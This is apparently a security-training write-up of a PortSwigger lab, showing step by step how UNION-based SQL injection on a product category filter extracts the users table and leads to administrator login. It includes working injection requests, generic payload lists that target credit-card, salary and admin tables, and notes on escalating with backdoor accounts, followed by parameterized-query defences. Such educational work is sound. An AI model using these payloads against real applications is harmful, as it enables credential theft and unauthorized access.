# Lab 10: SQL Injection UNION Attack - Retrieving Data from Other Tables

## Executive Summary

This lab demonstrates complete SQL injection exploitation progressing from vulnerability discovery to credential extraction and unauthorized access. Through systematic enumeration, I determined the query returns 2 columns, both accepting string data. Leveraging this knowledge, I crafted a UNION-based injection attack to extract usernames and passwords from the users table, successfully retrieving administrator credentials and achieving complete authentication bypass. This attack showcases the full exploitation lifecycle from reconnaissance to credential theft and system compromise.

## Lab Details

| Attribute              | Value |
|------------------------|-------|
| **Source**             | PortSwigger Web Security Academy |
| **Topic**              | SQL Injection |
| **Difficulty**         | Practitioner |
| **Vulnerability**      | SQL Injection - Data Extraction via UNION |
| **Risk**               | Critical - Complete Credential Theft & Authentication Bypass |
| **Completion**         | February 20, 2026 |

## Objective

Exploit SQL injection to enumerate database structure, extract user credentials from the users table using UNION-based injection, and authenticate as administrator to achieve complete system compromise.

## Testing Setup

**Tools Used:**
- Burp Suite Professional (Licensed to Gurpreet Singh)
- Burp Repeater for payload testing
- URL encoding for payload delivery
- Browser for authentication validation

**Target:** Product category filtering with SQL injection vulnerability

## Exploitation Walkthrough

### 1. Initial Reconnaissance

Accessed lab environment displaying "SQL injection UNION attack, retrieving data from other tables" challenge.
<img width="1920" height="982" alt="LAB1_ss1" src="https://github.com/user-attachments/assets/95e57195-4f27-49b4-862c-649eeab6c89f" />

*Lab 10 environment - Data extraction via UNION with Burp Suite Professional configured*

### 2. Attack Surface Identification

Explored product categories to identify SQL injection vectors.

<img width="1920" height="982" alt="LAB1_ss2" src="https://github.com/user-attachments/assets/f998c01f-cc4d-4b3a-8b90-12583a8167d6" />

*Category exploration - Tech & Gifts, Food & Drink categories showing category parameter*

**Available Categories:**
- Tech & Gifts
- Food & Drink
- Other product categories

**Request Captured:**
```http
GET /filter?category=Tech+%26+Gifts HTTP/1.1
Host: [lab-id].web-security-academy.net
```

**Backend SQL Query (Inferred):**
```sql
SELECT * FROM products WHERE category = 'Tech & Gifts'
```

**Attack Vector:** Category parameter likely incorporated directly into SQL WHERE clause without sanitization.

### 3. Column Count Enumeration

Sent request to Burp Repeater and determined column count using ORDER BY technique.

**Test Payload 1:**
```http
GET /filter?category=Tech+%26+Gifts'+ORDER+BY+1-- HTTP/1.1
```

**Response:** 200 OK - Column 1 exists

**Test Payload 2:**
```http
GET /filter?category=Tech+%26+Gifts'+ORDER+BY+2-- HTTP/1.1
```
<img width="1920" height="982" alt="LAB1_ss3 1" src="https://github.com/user-attachments/assets/b76548db-18e1-40e3-a8ba-2e49815ce424" />

*ORDER BY 2 test - 200 OK confirms 2 columns exist*

**SQL Query Executed:**
```sql
SELECT * FROM products WHERE category = 'Tech & Gifts' ORDER BY 2--'
```

**Response:** 200 OK - Column 2 exists

**Test Payload 3:**
```http
GET /filter?category=Tech+%26+Gifts'+ORDER+BY+3-- HTTP/1.1
```
<img width="1920" height="982" alt="LAB1_ss3 2" src="https://github.com/user-attachments/assets/87777fc1-5cd2-4f42-ac2f-bf5ecaa2fca5" />

*ORDER BY 3 test - Internal Server Error confirms only 2 columns*

**Response:** 500 Internal Server Error

**Column Count Confirmed:** Exactly **2 columns** in the query result set.

### 4. String Data Type Testing

Systematically tested each column to identify which accept string data.

**Test Payload 1:**
```http
GET /filter?category=Tech+%26+Gifts'+UNION+SELECT+'a',NULL-- HTTP/1.1
```
<img width="1920" height="982" alt="LAB1_ss4 1" src="https://github.com/user-attachments/assets/2489d88f-27bd-4d50-9d14-c71dec0184f3" />

*Column 1 string test - 200 OK confirms first column accepts strings*

**SQL Query Executed:**
```sql
SELECT * FROM products WHERE category = 'Tech & Gifts' 
UNION SELECT 'a', NULL--'
```

**Response:** 200 OK

**Analysis:** Column 1 ACCEPTS string data.

**Test Payload 2:**
```http
GET /filter?category=Tech+%26+Gifts'+UNION+SELECT+'a','a'-- HTTP/1.1
```

<img width="1920" height="982" alt="LAB1_ss4 2" src="https://github.com/user-attachments/assets/20acf837-7403-4e3e-a9bc-5a95fa6a33f2" />

*Both columns string test - 200 OK confirms both columns accept strings*

**SQL Query Executed:**
```sql
SELECT * FROM products WHERE category = 'Tech & Gifts' 
UNION SELECT 'a', 'a'--'
```

**Response:** 200 OK

**Data Type Mapping:**

| Column Position | Accepts Strings? |
|----------------|------------------|
| Column 1 | ✅ Yes |
| Column 2 | ✅ Yes |

**Perfect Scenario:** Both columns accept string data, enabling extraction of any textual information (usernames, passwords, emails, etc.).

### 5. Credential Extraction from Users Table

**Attack Strategy:** 
Standard database applications typically store user credentials in a table named `users` with columns `username` and `password`. Attempted direct extraction using UNION injection.

**Attack Payload:**
```http
GET /filter?category=Tech+%26+Gifts'+UNION+SELECT+username,password+FROM+users-- HTTP/1.1
```
<img width="1920" height="982" alt="LAB1_ss5 1" src="https://github.com/user-attachments/assets/425af441-3bb1-46dd-bc69-61019734692a" />

*Credential extraction successful - All usernames and passwords retrieved from users table*

**SQL Query Executed:**
```sql
SELECT * FROM products WHERE category = 'Tech & Gifts' 
UNION SELECT username, password FROM users--'
```

**Response:** 200 OK with all user credentials displayed

**Credentials Extracted:**
```
administrator : [admin_password]
carlos        : [carlos_password]  
wiener        : [wiener_password]
```

<img width="1920" height="982" alt="LAB1_ss5 2" src="https://github.com/user-attachments/assets/299bb0ca-d5e6-4a6a-baa5-9d08c2f5ca2c" />

*Administrator credentials identified and copied from response*

**Critical Data Obtained:**
- **Administrator username:** `administrator`
- **Administrator password:** `[extracted_password]`

**Attack Success:**
- ✅ Users table exists and is accessible
- ✅ Username and password columns identified
- ✅ All user credentials extracted
- ✅ Administrator account credentials obtained

### 6. Administrator Authentication & System Compromise

Used extracted administrator credentials to authenticate and gain unauthorized access.

<img width="1920" height="982" alt="LAB1_ss6" src="https://github.com/user-attachments/assets/0944dda5-b4d6-4f50-88c6-4d231d8791cb" />

*Administrator account accessed successfully - Complete system compromise achieved | Lab completion confirmed*

**Authentication Request:**
```http
POST /login HTTP/1.1

username=administrator&password=[extracted_password]
```

**Response:** 302 Found - Redirect to administrator dashboard

**Complete System Compromise:**
- ✅ Database structure enumerated (2 columns, both strings)
- ✅ Users table identified and accessed
- ✅ All user credentials extracted
- ✅ Administrator credentials obtained
- ✅ Full authentication bypass achieved
- ✅ Complete administrative access granted

**Lab completion confirmed: "Congratulations, you solved the lab!"**

## Technical Impact

**Severity: Critical (CVSS 9.8)**
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

**Primary Vulnerability:**

**CWE-89: SQL Injection**
- User input directly incorporated into SQL queries
- No parameterized queries or input sanitization
- Complete database access achievable
- Credential theft and authentication bypass

**Complete Attack Chain:**
```
Product Category Filtering
        ↓
SQL Injection Vulnerability Discovery
        ↓
Column Enumeration (ORDER BY 1,2,3)
        ↓
Column Count: 2 columns
        ↓
Data Type Testing (UNION SELECT 'a',NULL)
        ↓
Both Columns Accept Strings
        ↓
Credential Extraction (UNION SELECT username, password FROM users)
        ↓
Administrator Credentials Stolen
        ↓
Authentication Bypass
        ↓
Complete System Compromise
```

**Why This Attack is Devastating:**

**1. Direct Credential Access:**
Unlike information disclosure or version enumeration, this attack:
- Extracts actual usernames and passwords
- Provides immediate authentication capability
- Bypasses all other security controls
- Grants administrative privileges

**2. Zero Prerequisites:**
The attack requires:
- ✅ No prior authentication
- ✅ No special permissions
- ✅ No complex exploitation
- ✅ Just SQL injection + knowledge of common table names

**3. Universal Applicability:**
Most applications have:
- `users` table (standard naming)
- `username` and `password` columns (common structure)
- Predictable database schemas
- Similar credential storage patterns

**UNION-Based Data Extraction Techniques:**

**Generic Extraction Pattern:**
```sql
-- Extract from users table
' UNION SELECT username, password FROM users--

-- Extract from customers table
' UNION SELECT email, credit_card FROM customers--

-- Extract from employees table
' UNION SELECT employee_id, salary FROM employees--

-- Extract from orders table
' UNION SELECT order_id, total_amount FROM orders--
```

**Advanced Extraction Examples:**

**Concatenate Multiple Columns:**
```sql
-- Combine username and password with separator
' UNION SELECT username || ':' || password, NULL FROM users--

-- Result: administrator:P@ssw0rd123
```

**Extract from Multiple Tables:**
```sql
-- First extract users
' UNION SELECT username, password FROM users--

-- Then extract customers
' UNION SELECT name, email FROM customers--

-- Then extract admins
' UNION SELECT admin_user, admin_pass FROM administrators--
```

**Real-World Attack Scenarios:**

| Application Type | Extracted Data | Impact |
|-----------------|----------------|--------|
| **E-Commerce** | Customer emails, payment info, order history | Financial fraud, identity theft |
| **SaaS Platform** | User credentials, API keys, tenant data | Multi-customer breach, service compromise |
| **Healthcare** | Patient names, diagnoses, PHI | HIPAA violation, medical identity theft |
| **Banking** | Account numbers, balances, transactions | Financial theft, fraud |
| **Corporate** | Employee records, salaries, SSNs | Data breach, corporate espionage |

**Attack Progression After Credential Theft:**

**Immediate Actions:**
```
Administrator Access Obtained
        ↓
Extract Additional Data
        ↓
Create Backdoor Accounts
        ↓
Modify Application Settings
        ↓
Exfiltrate Sensitive Information
        ↓
Maintain Persistent Access
```

**Escalation Opportunities:**

**With Admin Access:**
- Create additional administrator accounts
- Modify user permissions and roles
- Access all application functionality
- Export complete database contents
- Install backdoors for persistent access
- Pivot to other systems using same credentials

**Why Standard Table Names Work:**

**Common Naming Conventions:**
- `users`, `user`, `accounts`, `members`
- `administrators`, `admins`, `staff`
- `customers`, `clients`, `subscribers`

**Common Column Names:**
- `username`, `user_name`, `login`, `email`
- `password`, `pass`, `pwd`, `password_hash`
- `id`, `user_id`, `account_id`

Most developers follow these conventions, making exploitation straightforward.

## Key Takeaways

**Penetration Testing Methodology:**
- Systematic column and data type enumeration
- UNION-based injection for data extraction
- Credential harvesting from standard tables
- Authentication validation and impact demonstration

**Critical Security Insights:**

**1. UNION Injection Enables Direct Data Theft:**
Unlike error-based or blind injection, UNION attacks:
- Extract data directly in application responses
- Require minimal requests (often just one)
- Work across all database types
- Provide complete visibility into data

**2. Standard Table Names are Targets:**
Attackers always try common table names first:
```sql
' UNION SELECT username, password FROM users--
' UNION SELECT username, password FROM accounts--
' UNION SELECT user, pass FROM members--
' UNION SELECT email, password FROM customers--
```

**3. Complete Exploitation Process:**

**Phase 1 - Discovery:**
```sql
' -- (confirm vulnerability)
```

**Phase 2 - Enumeration:**
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3-- (error = 2 columns)
```

**Phase 3 - Data Type Testing:**
```sql
' UNION SELECT 'a', NULL--
' UNION SELECT 'a', 'a'--  (both columns string)
```

**Phase 4 - Data Extraction:**
```sql
' UNION SELECT username, password FROM users--
```

**Phase 5 - Access:**
```
Use extracted credentials → Login as administrator
```

**4. Defense Requires Parameterized Queries:**

**Vulnerable Code:**
```python
query = "SELECT * FROM products WHERE category = '" + category + "'"
result = database.execute(query)
```

**Secure Code:**
```python
query = "SELECT * FROM products WHERE category = ?"
result = database.execute(query, [category])
```

**Why This Prevents All Extraction:**
- User input never interpreted as SQL code
- UNION attempts treated as literal category names
- Database structure completely protected
- No data extraction possible

**5. Additional Security Layers:**

**Beyond Parameterized Queries:**
- Least privilege database accounts (web app shouldn't access users table)
- Output encoding (prevent credential display even if extracted)
- Input validation (whitelist expected categories)
- Web Application Firewall (detect UNION patterns)
- Database activity monitoring (alert on users table access)

**Professional Skills Demonstrated:**
- Complete SQL injection exploitation lifecycle
- UNION-based data extraction techniques
- Credential harvesting methodology
- Understanding of common database schemas
- Authentication bypass validation
- Full attack chain documentation from discovery to compromise

## References

1. PortSwigger Web Security Academy - SQL Injection
2. OWASP Top 10 (2021) - A03: Injection
3. CWE-89 - SQL Injection
4. OWASP SQL Injection Prevention Cheat Sheet
5. UNION-Based SQL Injection Techniques

---

## Legal Notice

**Copyright © 2025 Gurpreet Singh**  
Licensed under CC BY-NC-ND 4.0

**Repository:** https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs

**Disclaimer:** This documentation is for authorized security testing and educational purposes only. All techniques were performed in a controlled laboratory environment with explicit permission. Unauthorized access to systems, credential theft, or database enumeration is illegal under applicable laws worldwide.
